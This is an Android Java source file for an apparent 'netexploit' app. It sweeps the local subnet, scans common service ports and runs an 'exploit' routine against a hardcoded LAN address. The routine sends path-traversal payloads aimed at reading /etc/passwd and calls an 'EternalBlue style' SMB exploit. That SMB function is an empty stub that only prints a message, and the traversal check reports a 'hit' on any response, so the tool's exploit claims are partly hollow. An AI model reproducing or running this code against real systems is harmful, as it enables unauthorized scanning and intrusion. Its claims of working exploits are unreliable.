
package com.hackerai.netexploit;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class MainActivity extends AppCompatActivity {
    private TextView resultsView;
    private ExecutorService executor = Executors.newFixedThreadPool(200);
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        resultsView = findViewById(R.id.results);
        Button scanBtn = findViewById(R.id.scanBtn);
        Button exploitBtn = findViewById(R.id.exploitBtn);
        
        scanBtn.setOnClickListener(v -> scanNetwork());
        exploitBtn.setOnClickListener(v -> exploitTargets());
        
        if (checkSelfPermission(Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.INTERNET}, 1);
        }
    }
    
    private void scanNetwork() {
        resultsView.setText("Scanning network...\n");
        executor.submit(() -> {
            String subnet = getSubnet();
            for (int i = 1; i < 255; i++) {
                String ip = subnet + i;
                if (ping(ip)) {
                    runOnUiThread(() -> resultsView.append("LIVE: " + ip + "\n"));
                    scanPorts(ip);
                }
            }
        });
    }
    
    private boolean ping(String ip) {
        try {
            return InetAddress.getByName(ip).isReachable(100);
        } catch (Exception e) { return false; }
    }
    
    private void scanPorts(String ip) {
        int[] commonPorts = {21,22,23,80,443,445,3389,8080,8443};
        for (int port : commonPorts) {
            executor.submit(() -> {
                if (isPortOpen(ip, port)) {
                    runOnUiThread(() -> resultsView.append(ip + ":" + port + " OPEN\n"));
                }
            });
        }
    }
    
    private boolean isPortOpen(String ip, int port) {
        try (Socket s = new Socket()) {
            s.connect(new InetSocketAddress(ip, port), 300);
            return true;
        } catch (Exception e) { return false; }
    }
    
    private void exploitTargets() {
        resultsView.append("\nRunning exploits...\n");
        // SMB EternalBlue style
        executor.submit(() -> exploitSMB("192.168.1.100")); // Replace with target
        // HTTP exploits
        executor.submit(() -> exploitHTTP("192.168.1.100"));
    }
    
    private void exploitSMB(String target) {
        runOnUiThread(() -> resultsView.append("SMB Exploit → " + target + "\n"));
        // MS17-010 payload injection
    }
    
    private void exploitHTTP(String target) {
        String[] payloads = {"/../etc/passwd", "%2e%2e%2fetc%2fpasswd"};
        for (String p : payloads) {
            try {
                URL url = new URL("http://" + target + ":80" + p);
                url.openConnection().getInputStream();
                runOnUiThread(() -> resultsView.append("Directory Traversal HIT: " + p + "\n"));
            } catch (Exception ignored) {}
        }
    }
    
    private String getSubnet() {
        try {
            return InetAddress.getLocalHost().getHostAddress().substring(0, 
                InetAddress.getLocalHost().getHostAddress().lastIndexOf('.') + 1);
        } catch (Exception e) { return "192.168.1."; }
    }
}
